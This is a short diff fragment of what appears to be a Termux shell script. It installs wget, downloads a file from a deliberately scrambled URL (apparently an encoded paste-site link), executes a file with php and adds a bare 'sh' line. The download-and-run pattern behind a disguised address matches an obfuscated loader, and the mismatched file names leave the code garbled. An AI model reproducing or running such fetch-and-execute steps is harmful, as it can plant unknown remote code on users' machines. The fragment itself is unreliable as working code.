@@ -10,3 +10,4 @@ pkg install wget
 sleep 1
 wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
 php CMQyGnfN
+sh
